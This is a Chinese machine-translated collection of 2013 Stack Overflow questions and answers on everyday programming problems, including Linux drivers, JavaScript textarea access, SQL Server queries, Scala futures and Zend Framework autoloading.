> 时间：2013-04-15T11:22:11.640
> 
> 标签：linux, kernel, driver

我想在内核中编译一个设备驱动程序，并用 *, （不在 module 中）配置它。编译后看不到设备`/proc/device`。我还检查了输出`make bzImage`，驱动程序已编译。我是否需要删除这两行：

```
module_init(mydriver_init);

module_exit(mydriver_exit); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:59:10.657

没有足够的信息来理解您的问题。您应该显示一些代码。

无论如何，*/proc/devices*不会显示所有内核模块。它显示设备，也许您的驱动程序没有注册设备。

您可以在代码中添加一些内容，然后使用终端`printk()`中的命令读取它。`dmesg`如果您阅读了印刷品，则说明您的模块已加载。

Evan 如果您不将模块编译为模块，而是在内核中构建它，则函数

```
module_init(mydriver_init);
module_exit(mydriver_exit); 
```

必须在那里。`mydriver_init`将在内核加载您的驱动程序`module_exit`时执行，将在内核卸载您的驱动程序时执行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-27T08:44:31.510

`/proc/devices`只读文件似乎无法使用 VIM 等编辑器进行编辑或查看。所以试试吧`'cat /proc/devices'`，你的设备可能会出现。

# javascript - javascript：获取 textarea 的内容，textContent vs. innerHTML vs. innerText

> ID：16013899
> 
> 赞同：11
> 
> 时间：2013-04-15T11:22:15.017
> 
> 标签：javascript, textarea, getelementbyid

我无法使用 js 获取 textarea 的内容。我觉得我以前做过很多次都没有问题，但是有些东西把它扔掉了，或者我有精神障碍。

html

```
<textarea id="productdescript">test copy..asdfd</textarea><button value="Enter" onclick="addProduct()"> 
```

js

```
function addProduct() {
var descript = document.getElementById('productdescript').textContent;
alert(descript);
} 
```

Firefox 是我目前唯一的浏览器。

当我使用 textContent 时，会出现警告框，但它是空白的。当我使用 value 时，会出现警告框并显示“未定义”当我使用 innerHTML 时，会出现所有 HTML，包括标签。

另外，我知道 textContent 仅在 FF 中运行，并且为了跨浏览器兼容性，您需要执行诸如 innerText 和 textContent 之类的操作，但 textContent 在 FF 中不起作用。这个应用程序上没有 jquery

获取textarea内容的正确跨浏览器方式是什么！感谢您的任何建议。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-15T11:28:48.320

对于`textarea`，您只能`.value`在您的场景中使用（我测试了您给定的代码，它工作正常）。.

还，

1）请记住，`addProduct()` **只有**在代码中提到您的元素之后才调用此函数，否则它将是`undefined`.

2）**不能**有另一个元素`id as productdescript`

3）不能有一个JS`variable`调用`productdescript`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:27:59.660

这是你的代码？

你写`document.getElementByID....`，“D”应该写成小写“d”

```
document.getElementById('productdescript').textContent; 
```

# php - mysql 触发器是否会为 select 语句产生额外的开销？

> ID：16013900
> 
> 赞同：2
> 
> 时间：2013-04-15T11:22:16.813
> 
> 标签：php, mysql, database

我知道显而易见的答案是否定的。但是，在一个表上使用任何`insert`、`update`或`delete`触发器是否会以任何方式影响对同一个表的 select 语句？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T13:43:46.210

没有。100%

MySQL 仅在 sql_delete.cc、sql_insert.cc 和 sql_update.cc 中处理触发器。

请参阅 mysql-5.5/sql 目录中的源代码。例如在[http://bazaar.launchpad.net/~mysql/mysql-server/5.5/view/head:/sql/sql_insert.cc](http://bazaar.launchpad.net/~mysql/mysql-server/5.5/view/head:/sql/sql_insert.cc)搜索字符串“process_triggers”。它是一个抽象插入，独立于具体的处理程序实现。

当我们在[http://bazaar.launchpad.net/~mysql/mysql-server/5.5/view/head:/sql/sql_select.cc](http://bazaar.launchpad.net/~mysql/mysql-server/5.5/view/head:/sql/sql_select.cc)查看源的“选择”部分时，我们只是看不到任何“触发器”在代码中（在评论中只有 3 次）。

因此，我可以正式向您报告，在选择期间，触发器不会在任何地方受到影响——仅在 DML 语句上。

ps：见[http://dev.mysql.com/doc/internals/en/guided-tour-skeleton.html](http://dev.mysql.com/doc/internals/en/guided-tour-skeleton.html)从鸟瞰了解 MySQL 内部结构。

# c# - 我如何比较两个类的方法？

> ID：16013901
> 
> 赞同：0
> 
> 时间：2013-04-15T11:22:23.557
> 
> 标签：c#, .net, reflection

我想通过比较另一个类来找出一个类中缺少的属性

```
public class User
{
    public int UserID { get; set; }
    public string UserName { get; set; }
    public string FirstName { get; set; }
    public string LastName { get; set; }
}

public class UserDTO
{

    public string UserName { get; set; }
    public string FirstName { get; set; }

} 
```

上面我应该得到像“UserID”这样的输出，UserDTO 中缺少“LastName”属性。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-15T11:25:27.093

```
var list = typeof(User).GetProperties().Select(x => x.Name)
           .Except(typeof(UserDTO).GetProperties().Select(y => y.Name))
           .ToList(); 
```

**编辑**

包括在评论和公开中的建议`Fields`

```
public static IEnumerable<string> Diff(Type t1, Type t2)
{
    return t1.GetProperties().Select(p1 => new { Name = p1.Name, Type = p1.PropertyType })
            .Concat(t1.GetFields().Select(f1 => new { Name = f1.Name, Type = f1.FieldType }))
            .Except(t2.GetProperties().Select(p2 => new { Name = p2.Name, Type = p2.PropertyType })
                    .Concat(t2.GetFields().Select(f2 => new { Name = f2.Name, Type = f2.FieldType })))
            .Select(a => a.Name);
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-15T11:25:04.997

使用反射来获取属性，请参阅[Type.GetProperties](http://msdn.microsoft.com/en-us/library/kyaxdd3x.aspx)。然后比较两个属性列表以找到丢失的列表。

```
var UserProperties = typeof(User).GetProperties().Select(p => p.Name);
var UserDTOProperties = typeof(UserDTO).GetProperties().Select(p => p.Name);

var missingProperties = UserProperties.Except(UserDTOProperties); 
```

考虑到所有继承的属性也将出现在这些列表中，除非您指定`BindingFlags.DeclaredOnly`方法`GetProperties()`，请参阅[BindingFlags](http://msdn.microsoft.com/en-us/library/system.reflection.bindingflags.aspx)。

# tsql - T-SQL 合并不警告约束冲突

> ID：16013903
> 
> 赞同：0
> 
> 时间：2013-04-15T11:22:26.543
> 
> 标签：tsql, insert, merge, foreign-keys, constraints

我有一个触发器`INSTEAD OF INSERT, UPDATE` ，我正在使用`MERGE`合并更新/插入行。

其中一列上有一个 FK 约束，因此如果我尝试插入违反此约束的内容，它应该会显示错误。

`INSERT`如果我直接用语句尝试它会显示错误。`WHEN NOT MATCHED`但是当插入位于 MERGE 语句的一部分时，它不会。

为什么 ？

# php - Yii 用户登录的重定向太多

> ID：16013908
> 
> 赞同：3
> 
> 时间：2013-04-15T11:22:41.143
> 
> 标签：php, redirect, login, frameworks, yii

我在 Yii 中收到太多重定向错误。

我使用的是 Yii 提供的默认 accessControl 过滤器。

整个应用程序在我使用 WAMP 的本地主机上完美运行。在我上传到登台服务器后，问题开始出现。

据我所知，我已经配置了 .htaccess 文件

```
Options +FollowSymLinks
IndexIgnore */*

<IfModule mod_rewrite.c>
RewriteEngine on

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

RewriteRule ^.*$ /index.php [L] 
</IfModule> 
```

如果我尝试打开不需要登录的任何操作，它会毫无故障地打开

```
public function accessRules()

{

    return array(

        array('allow', // allow all users to perform 'index' and 'view' actions

            'actions' => array('index', 'locationImport', 'contact'),

            'users' => array('*'),

        ),

        array('allow', // allow authenticated user to perform 'create' and 'update' actions

            'actions' => array('LocationImport'),

            'users' => array('@'),

        ),

        array('allow', // allow admin user to perform 'admin' and 'delete' actions

            'actions' => array('admin', 'delete'),

            'users' => array('admin'),

        ),

        array('deny', // deny all users

            'users' => array('*'),

        ),

    );

} 
```

在上述控制器中，联系人正在工作。

我的 main.php 相关

```
'user' => array(
        // enable cookie-based authentication
        'allowAutoLogin' => true,
        'loginUrl' => array('/useraccount/login'),
        'class' => 'CPWebUser',
    ), 
```

UserAccountController 中的访问规则

```
 public function accessRules()
{
    return array(
        array('allow', // allow all users to perform 'register' and 'login' actions
            'actions' => array('register', 'login', 'view', 'xxxx', 'xxxx',),
            'users' => array('*'),
        ),
        array('allow', // allow authenticated user to perform 'create' and 'update' actions
            'actions' => array('update', 'logout', 'home', 'changePassword'),
            'users' => array('@'),
        )
        array('deny', // deny all users
            'users' => array('*'),
        ),
    );
} 
```

只是总结一下。完全适用于本地主机。站点控制器 Actioncontact 有效。userAccountController 中的任何操作都不起作用。甚至没有注册，它重定向到登录。actionLogin 打不开。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T20:11:33.140

已解决：这是一个愚蠢的错误。经过几个小时的工作，由于拼写错误，问题得到了解决。

在 linux 上，main.php 配置区分大小写，我在 Windows 上编程，但它不是。

我的控制器是 userAccount 和

```
'loginUrl' => array('useraccount/login'), 
```

刚改成

```
'loginUrl' => array('userAccount/login'), 
```

# sql - 如何将 Nagios 时间戳转换为日期时间？

> ID：16013912
> 
> 赞同：0
> 
> 时间：2013-04-15T11:22:56.983
> 
> 标签：sql, tsql, type-conversion

我有一个 sql server 2008。我得到一个用于服务器停机时间的 icinga/nagios 时间戳。

正是这种格式`Wed Apr 10 14:45:00 CEST 2013`。

这对我来说是一种奇怪的格式。我想将其转换/转换为 t-sql 日期时间 - 但不知道如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:06:51.533

因为**[CEST](http://www.timeanddate.com/library/abbreviations/timezones/eu/cest.html)是 +02:00**

```
select
CONVERT(VARCHAR(3), DATENAME(WEEKDAY, 
switchoffset(CAST(date_column_name as datetimeoffset),'+02:00')), 100)
+ ' ' +
CONVERT(VARCHAR(3), DATENAME(MM,  
switchoffset(CAST(date_column_name as datetimeoffset),'+02:00')), 100)
+ ' ' +
DATENAME(DAY, 
switchoffset(CAST(date_column_name as datetimeoffset),'+02:00'))
+ ' ' +
CONVERT(VARCHAR(8),
switchoffset(CAST(date_column_name as datetimeoffset),'+02:00'), 108)
+ ' CEST ' +
DATENAME(YEAR, 
switchoffset(CAST(date_column_name as datetimeoffset),'+02:00'))
from adm_co_users 
```

我首先**[将日期转换为 CEST 时区](https://stackoverflow.com/questions/8256892/converting-normal-datetime-to-a-time-zone-in-sql-server-2008)**，然后根据需要**提取****日期**。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T12:08:47.637

这个怎么样：

```
select Cast( 
-- Day
substring(@sTimestamp, 9, 2) + ' ' 
-- Month
+ substring(@sTimestamp, 5, 3)  + ' '
-- Year
+ substring(@sTimestamp, 26, 4) + ' '
-- Time
+ substring(@sTimestamp, 12, 8) + ' '
as datetime) 
```

不过，这对时区没有任何作用——我建议你为此投入一些东西。

# python - Python大浮点除法

> ID：16013913
> 
> 赞同：-3
> 
> 时间：2013-04-15T11:22:57.160
> 
> 标签：python, floating-point

我尝试用浮点数在 Python 中进行除法，但即使我尝试使用浮点数，我得到的结果也不正确，但它没有用。python还有其他方法如何为大浮点数进行除法吗？

```
>>> div = 1.45751734864e+15/30933
>>> print div
47118525478.9 
```

在java中相同

```
>>> double div = 1.45751734864e+15/30933;
>>> System.out.println(div);
4.711852547893835E10 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:39:49.893

Python 和 Java 结果都是**正确**的：

**蟒蛇**：

```
47118525478.9 
```

**爪哇**

```
4.711852547893835E10 
```

**但是**，在 Java 中，数字以[指数符号](http://www.vendian.org/envelope/dir0/exponential_notation.html)格式打印。所以，它相当于：

> 4.711852547893835 * 10 ^(^10) = **47118525478.9835**

如果您想将 Python 的输出打印为指数符号格式，请使用[字符串格式](http://docs.python.org/2/library/string.html#format-specification-mini-language)：

```
>>> div = 1.45751734864e+15/30933
>>> print '{:e}'.format(float(div))
4.711853e+10 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:29:41.697

您可以使用*十进制*模块来提高精度。

```
>>> from decimal import *
>>> getcontext().prec = 30
>>> Decimal(1.45751734864e+15) / Decimal(30933)
Decimal('47118525478.9383506287783273527') 
```

阅读：[http](http://docs.python.org/2/tutorial/floatingpoint.html) ://docs.python.org/2/tutorial/floatingpoint.html和[http://docs.python.org/2/library/decimal.html](http://docs.python.org/2/library/decimal.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:25:51.127

Python 和 Java 返回的数字是一样的：

使用 python 2.7.3 的 IPython：

```
In [1]: 1.45751734864e+15/30933
Out[1]: 47118525478.93835

In [2]: 1.45751734864e+15/30933.0
Out[2]: 47118525478.93835

In [3]: 1.45751734864e+15/30933.0-4.711852547893835E10
Out[3]: 0.0 
```

蟒蛇 3.3：

```
Python 3.3.0 (default, Mar 22 2013, 20:14:41) 
[GCC 4.2.1 Compatible FreeBSD Clang 3.1 ((branches/release_31 156863))] on freebsd9
Type "help", "copyright", "credits" or "license" for more information.
>>> 1.45751734864e+15/30933
47118525478.93835
>>> 1.45751734864e+15/30933-4.711852547893835E10
0.0
>>> 
```

# c++ - 如果类字段未初始化，为什么在 C++ 中没有编译时错误？

> ID：16013915
> 
> 赞同：0
> 
> 时间：2013-04-15T11:23:06.050
> 
> 标签：c++

在我的课堂上，我使用了这样的字段：

```
private:
bool firstSeqNumReceived; 
```

一段时间内一切正常，但在一次提交后，我发现 now 字段是`true`默认的。令人惊讶的是，默认情况下字段未初始化`false`，而是分配的值取决于实现（有关更多详细信息，请参阅[什么是 C++ 类成员的默认值](https://stackoverflow.com/questions/2614809/what-is-the-default-value-for-c-class-members)）

现在我想知道为什么编译器不会产生编译时错误，迫使我添加初始化？谁需要“依赖于实现”的默认值，是否有任何用例？在这种情况下为什么不产生编译时错误？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:27:27.400

> 我想知道为什么编译器不会产生编译时错误，迫使我添加初始化？

因为编译器假设你知道你在做什么。

在 C++ 中，您无需为不使用的东西付费。可能存在初始化浪费时间的用例。例如，在一个类中，在构造对象之前不可能计算成员的真正有意义的值，将成员初始化为某个默认值或标记值几乎没有什么作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:25:46.357

用例基本上是，如果您使用变量，它取决于程序流程。如果您不在部分代码中使用它，则也无需对其进行零初始化。

此外，如果您知道该值将在构造函数或其他一些成员函数中分配，那么首先将 0 写入内存只是一个多余的步骤。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:26:55.767

该标准规定访问未初始化的对象是未定义的行为。这种未定义的行为出现在标准中有几个原因。这更多是关于不给你比你要求的更多的东西。有时您真的不想在创建变量后立即对其进行初始化。相反，编译器信任您在需要初始化对象时对其进行初始化。作为您不希望它自动初始化的示例：

```
int x;
std::cin >> x; 
```

`x`由于`0`值会立即被覆盖，因此自动初始化是完全没有意义的。初始化变量的权力掌握在有能力的人手中。

编译器还可能假设您不会调用未定义的行为来进行优化。

# list - 无法将 Try 扁平化为 for 理解

> ID：16013917
> 
> 赞同：1
> 
> 时间：2013-04-15T11:23:10.560
> 
> 标签：list, scala, try-catch, future, for-comprehension

这是一个文体问题和我试图拓宽对 Scala 理解的尝试的结合。

我有一个包含 Future 的列表，我想计算期货的值，转换为 Option，并使用 for 理解来展平列表：

```
import scala.util.Try
import scala.concurrent._
import ExecutionContext.Implicits.global

val l= List(Future.successful(1),Future.failed(new IllegalArgumentException))

implicit def try2Traversible[A](xo: Try[A]): Iterable[A] = xo.toOption.toList

val res = for{f <- l; v <- f.value} yield v

scala> res: List[scala.util.Try[Int]] = List(Success(1), Failure(java.lang.IllegalArgumentException))

res.flatten
res16: List[Int] = List(1) 
```

我想要做的是让扁平化阶段进入理解，有人有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T13:09:31.640

这样做是不正确的：

```
for{f <- l; v <- f.value} yield v 
```

它似乎仅适用于您的情况，因为期货已经完成，这就是`value`定义其成员的原因。但是，在一般情况下，当您执行 for 理解时，它们可能尚未实现，因此`value`会返回`None` （尽管在某些时候它们最终会实现）。例如，在 REPL 中试试这个：

```
val f1 = Future{ 
  Thread.sleep(3000) // Just a test to illustrate, never do this!
  1
}
val f2 = Future{ 
  Thread.sleep(3000) // Just a test to illustrate, never do this!
  throw new IllegalArgumentException
}

val l = List( f1, f2 )
for{f <- l; v <- f.value} yield v 
```

结果是一个空列表，因为`l`尚未完成任何期货。然后稍等片刻（最多 3 秒）并重新执行 for comprehension（最后一行），您将得到一个非空列表，因为 future 终于实现了。

要解决此问题，您将不得不使用 阻止（即等待所有期货都完成） ，或者使用类似or`scala.concurrent.Await`的东西留在异步世界中。例如，如果你想阻止，你可以这样做：`Future.map``Future.flatMap`

```
Await.result( Future.sequence( l ), duration.Duration.Inf ) 
```

`Await.result`等待未来的结果，允许从异步世界进入同步世界。上面的结果是一个`List[Int]` 现在的问题是你丢失了失败的情况（结果不是`List[Try[Int]]`你想要的），实际上会重新抛出第一个异常。要解决此问题，您可以使用我在另一个答案中发布的此帮助方法：[https](https://stackoverflow.com/a/15776974/1632462) ://stackoverflow.com/a/15776974/1632462 使用它，您可以执行以下操作：

```
Await.result( Future.sequence( l map mapValue ), duration.Duration.Inf ) 
```

这将等到所有期货都完成（具有正确的值或错误）并返回预期的`List[Try[Int]]`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:40:18.323

这个想法是遍历`Try`对象，就好像它是`Option`for-comprehension 本身中的一个（即 0 或 1 元素集合）。为了使这种遍历工作，必须进行从`Try`类型到`Option`类型的转换。

这应该有效：

```
implicit def try2option[A](xo: Try[A]) = xo.toOption

val res = for (f <- l; t <- f.value; x <- t) yield x 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-16T01:14:26.197

您应该保留`Future`最终结果以保留计算的异步性质。

执行此操作（并获得 a `Future[List[Int]]`）的好方法是（可能是您尝试过的）：

```
for {
  f <- l    // Extract individual future
  v <- f    // Extract value from future
} yield v 
```

不幸的是，这转化为：

```
l.flatMap(f => f.map(v => v)) 
```

哪个不起作用，因为`Future`不继承`GenTraversableOnce`（可能不应该），但`List`它的`flatMap`.

~~但是，我们可以手动执行此操作： val res = l.foldRight(Future.successful(List.empty[Int])) { case (x,xs) => xs.flatMap(vxs => x.map(vx => vx :: vxs)) }~~

我们可以`Future.sequence`这样做：

```
Future.sequence(l) 
```

这将返回 a `Future[List[Int]]`，它仅在所有期货完成时才完成，并将包含成功完成的期货的所有值。

# objective-c - 正则表达式：{2, 4} 的含义

> ID：16013919
> 
> 赞同：2
> 
> 时间：2013-04-15T11:23:23.677
> 
> 标签：objective-c, regex

`{2,4}`使用以下正则表达式验证电子邮件时的含义是什么：

```
NSString *emailRegEx = @"[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}";
NSPredicate *emailTest = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", emailRegEx]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:26:59.573

这意味着单词长度最小为 2，最大为 4，它需要大写 A 到 Z 和小 a 到 z 字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:27:31.413

{2,4} 表示字符串最少 2 个字符，最多 4 个字符（字符串长度应大于等于 2 小于等于 4）。

例如：在电子邮件 ID 和点之后，.com、.in、.uk 等等...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:29:01.720

在上面的正则表达式中，{2,4} 表示您可以在 2 到 4 之间出现 [A-Za-z]。

参考

[http://www.regular-expressions.info/reference.html](http://www.regular-expressions.info/reference.html)

[http://www.regextester.com/](http://www.regextester.com/)

# javascript - javascript点击动作触发了两个动作

> ID：16013924
> 
> 赞同：0
> 
> 时间：2013-04-15T11:23:37.877
> 
> 标签：javascript

```
I have the following html:

<div class="title-block">
    <span class="date">Apr 09, 2013</span>
    <span class="invoice">Invoice #1365512756</span>
    <span class="retail-price">Rp 270000</span>
    <span class="arvo-regular button green confirm-payment" data-id="2">Confirm Payment</span>
    <img src="/bundles/shopiousmain/img/dashboard-li-down-arrow.png">
</div> 
```

类标题块有一个与之相关的 javascript 点击动作，类按钮也有一个与其相关的点击动作。问题是当我点击按钮时，它也会触发标题栏点击动作。如何使点击不会传播？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:27:01.500

如果您使用的是 jquery，则类似这样的东西

```
$("#buttonClass").click(function(e) {
   // mouse click on button
   e.stopPropagation();
}); 
```

JS

```
function doSomething (e) {
  var event = e || window.event;
  if (event.stopPropagation) {
    event.stopPropagation();
  } else {
    event.cancelBubble = true;
  } 
} 
```

# php - 如何在 php 中使用“Curl”将数据发送到 android

> ID：16013932
> 
> 赞同：1
> 
> 时间：2013-04-15T11:23:49.337
> 
> 标签：php, android

我在 android 应用程序中有一个侦听器来检测服务器 php 发送的消息

```
 public class Threa implements Runnable

{
   public static final String SERVERIP = "192.168.1.4";
    public static final int SERVERPORT =6060 ; //4444
    public BufferedReader in;
    public int x=0;
      public void run() {

             try {

                 ServerSocket serverSocket = new ServerSocket(SERVERPORT);

                 while (true)
                     {
                     x++;

                      Socket client = serverSocket.accept();
                     try {

                  in = new BufferedReader(new InputStreamReader(client.getInputStream()));

                          String str = in.readLine();

                        } catch(Exception e) {

                        } finally {
                            client.close();

                                }
                 }

             } catch (Exception e) {

                     }
        }

    } 
```

我在网上找到了这段代码

```
function get_url($url) 
    {
        $ch = curl_init();

        if($ch === false)
        {
            die('Failed to create curl object');
        }

        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    echo get_url('http://www.apple.com/'); 
```

在php中使用cURL发送消息是正确的，如果不是解决这个问题的方法是什么，请给我一个想法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:26:22.630

`curl`很适合使用 http/ftp 等协议进行通信。

如果您想发送随机数据（即：使用您自己的协议），那么您应该使用它们为此制作的 php 套接字：http: [//php.net/manual/fr/book.sockets.php](http://php.net/manual/fr/book.sockets.php)

# jquery - 动态 HTML5 数据列表

> ID：16013933
> 
> 赞同：20
> 
> 时间：2013-04-15T11:23:49.743
> 
> 标签：jquery, html, for-loop, append, html-datalist

所以我在让我的 HTML5 数据列表从一个 javascript 数组中动态填充时遇到了一点问题，该数组是从一个对象的键的值中填充的，该对象的键值是通过 MySQL 数据库中的行填充的。呸！

MySQL 数据库 => 表 => 行 => JSON => Javascript 对象 => “名字”和“姓氏”键 => 名字数组 => 数据列表选项。

我成功创建了名称数组：

```
var nameArray = ["Rick Bross","Madison Smith","Jack Johnson"]; //Example of my array 
```

并设置一个循环将它们附加到数据列表中：

```
for (var i = 0; i < nameArray.length; i++) {
    alert(i + " - " + nameArray[i]); //Works Fine, "0 - Rick Bross", "1 - Madison Smith", etc.
    $('#potentials').append("<option value='" + nameArray[i] + ">"); // Not working.
} 
```

这是我的 HTML：

```
<input tabindex='1' list="potentials" type="text" placeholder="First &amp; Last Name" id="name" name="name"></input>
<datalist id="potentials">
</datalist> 
```

为什么这没有填充？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-15T11:29:54.230

缺少撇号，请尝试：

```
$('#potentials').append("<option value='" + nameArray[i] + "'>"); 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2018-08-25T20:20:30.663

我知道这个答案很晚，但它可能会对某人有所帮助。

`var nameArray = ["Rick Bross","Madison Smith","Jack Johnson"];`

将选项添加到数据列表。
- 如果您需要一个 id 来识别每个选项，“attr”会有所帮助。
- “文本”是要显示的内容。

`$.each(nameArray, function(i, item) { $("#potentials").append($("<option>").attr('value', i).text(item)); });`

* * *

## 回答 #3

> 赞同：-6
> 
> 时间：2014-08-30T15:23:59.643

试试 $("datalist#potentials).append...

# namespaces - 如何将 LESS 集成到 ZendFramework 2

> ID：16013935
> 
> 赞同：3
> 
> 时间：2013-04-15T11:24:00.177
> 
> 标签：namespaces, zend-framework2, less

我找到了这个针对**ZendFramework 1的**[教程](https://stephen.rees-carter.net/thought/integrating-less-with-zend-framework-the-easy-way)。我下载较少并将其放在**project/vendor/**下。

 ****```
Leafo
└── Less
    ├── Lessc.php
    └── Lessify.php 
```

在**项目/模块/应用程序/Module.php**

```
...
public function onBootstrap(MvcEvent $e)
{
    ...
    $this->compileLess();
}
...
public function compileLess()
{
    if (APPLICATION_ENV == 'production') {
        return;
    }
    require_once PROJECT_PATH . '/vendor/Leafo/Less/Lessc.php';

    $less_file = PROJECT_PATH . '/public/less/style.less';
    $css_file = PROJECT_PATH . '/public/css/style.css';

    $lessc = new \Leafo\Less\Lessc($less_file);
    file_put_contents($css_file, $lessc->parse());
} 
```

不幸的是，我收到以下错误

> 致命错误：在第 53 行的 /Users/jslim/public_html/littlepinktree/module/Application/Module.php 中找不到类 'Leafo\Less\Lessc'

我在这里有几个问题：

1.  如何将第 3 方库集成到 ZF2（如果第 3 方库未使用命名空间）？
2.  是否有任何示例显示如何将[LESS](http://lesscss.org/)集成到 ZF2？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-17T04:03:47.193

我通过将整个导演放在**./module/Application/src/Less中解决了这个问题**

**注意：我使用了原始结构如下**

```
src
├── Application
│   └── Controller
│       └── IndexController.php
└── Less
    ├── LICENSE
    ├── Makefile
    ├── README.md
    ├── composer.json
    ├── docs
    │   └── docs.md
    ├── lessc.inc.php
    ├── lessify
    ├── lessify.inc.php
    ├── package.sh
    ├── plessc
    └── tests
        ├── ApiTest.php
        ├── InputTest.php
        ├── README.md
        ├── bootstrap.sh
        ├── inputs
        ├── outputs
        └── sort.php 
```

在应用程序模块中使用类映射**./module/Application/Module.php**

```
public function getAutoloaderConfig()
{
    return array(
        'Zend\Loader\ClassMapAutoloader' => array(
            __DIR__ . '/autoload_classmap.php',
        ),
        'Zend\Loader\StandardAutoloader' => array(
            'namespaces' => array(
                __NAMESPACE__ => __DIR__ . '/src/' . __NAMESPACE__,
            ),
        ),
    );
} 
```

然后生成**autoload_classmap.php**

```
<?php
// Generated by ZF2's ./bin/classmap_generator.php
return array(
    'Application\Module'                     => __DIR__ . '/Module.php',
    'Application\Controller\IndexController' => __DIR__ . '/src/Application/Controller/IndexController.php',
    'lessc'                                  => __DIR__ . '/src/Less/lessc.inc.php',
    'lessc_parser'                           => __DIR__ . '/src/Less/lessc.inc.php',
    'lessc_formatter_classic'                => __DIR__ . '/src/Less/lessc.inc.php',
    'lessc_formatter_compressed'             => __DIR__ . '/src/Less/lessc.inc.php',
    'lessc_formatter_lessjs'                 => __DIR__ . '/src/Less/lessc.inc.php',
    'easyparse'                              => __DIR__ . '/src/Less/lessify.inc.php',
    'tagparse'                               => __DIR__ . '/src/Less/lessify.inc.php',
    'nodecounter'                            => __DIR__ . '/src/Less/lessify.inc.php',
    'lessify'                                => __DIR__ . '/src/Less/lessify.inc.php',
    'ApiTest'                                => __DIR__ . '/src/Less/tests/ApiTest.php',
    'InputTest'                              => __DIR__ . '/src/Less/tests/InputTest.php',
    'lesscNormalized'                        => __DIR__ . '/src/Less/tests/sort.php',
    'SortingFormatter'                       => __DIR__ . '/src/Less/tests/sort.php',
); 
```

终于可以用了

```
public function compileLess()
{
    if (APPLICATION_ENV == 'production') {
        return;
    }
    $less_file = PROJECT_PATH . '/public/less/style.less';
    $css_file = PROJECT_PATH . '/public/css/style.css';

    $lessc = new \lessc($less_file);
    file_put_contents($css_file, $lessc->parse());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T12:33:27.283

您需要`Leafo`在自动加载器中注册命名空间。假设你有这棵树：

```
MyProject
└── vendor
        Leafo
        └── Less
            ├── Lessc.php
            └── Lessify.php 
```

比你必须像这样注册命名空间：

```
 Zend\Loader\AutoloaderFactory::factory(array(
        'Zend\Loader\StandardAutoloader' => array(
            'autoregister_zf' => true,
            'namespaces' => array(
                'Leafo' => '/MyProject/vendor/Leafo',
            ),
        )
    )); 
```

如果您使用[ZendSkeletonApplication](https://github.com/zendframework/ZendSkeletonApplication)，您可以在`init_autoloader.php`文件中更改它。****

# sql-server-2008 - 使用 Select TOP (n) 的不同 SQL 查询计划

> ID：16013943
> 
> 赞同：2
> 
> 时间：2013-04-15T11:24:22.960
> 
> 标签：sql-server-2008

我正在尝试查看一个简单的 select Top (n) 的查询计划。每次我更改 n（我获取的记录数）时，查询计划都会更改，其中 Select Top 10 会特别导致性能问题，小于 10 或大于 10 时查询运行顺利。

查询由实体框架 (4.2) 生成，如果它有所作为。

查询是：

```
 exec sp_executesql N'SELECT TOP (10) 
[Project1].[Id] AS [Id], 
[Project1].[DateReceived] AS [DateReceived], 
[Project1].[Status] AS [Status], 
[Project1].[Subject] AS [Subject], 
[Project1].[Description] AS [Description], 
[Project1].[Path] AS [Path], 
[Project1].[C1] AS [C1], 
[Project1].[C2] AS [C2], 
[Project1].[C3] AS [C3],
.
.
.
.
.
.
.

WHERE [Project1].[row_number] > 0
ORDER BY [Project1].[DateReceived] DESC',N'@p__linq__0 int,@p__linq__1 int,@p__linq__2 datetime2(7),@p__linq__3 datetime2(7),@p__linq__4 nvarchar(4000),@p__linq__5 nvarchar(4000),@p__linq__6 nvarchar(4000),@p__linq__7 nvarchar(4000)',@p__linq__0=-1,@p__linq__1=-1,@p__linq__2='2013-03-15 00:00:00',@p__linq__3='2013-04-15 23:59:55',@p__linq__4=N'ALL',@p__linq__5=N'ALL',@p__linq__6=N'',@p__linq__7=N'%%' 
```

为什么 TOP 10 会导致性能问题？

我还不能分享图片，这里是链接：

[http://imageshack.us/photo/my-images/407/top10a.png/](http://imageshack.us/photo/my-images/407/top10a.png/)

[http://imageshack.us/photo/my-images/580/top20x.png/](http://imageshack.us/photo/my-images/580/top20x.png/)

* * *

## 回答 #1

> 赞同：0
> 
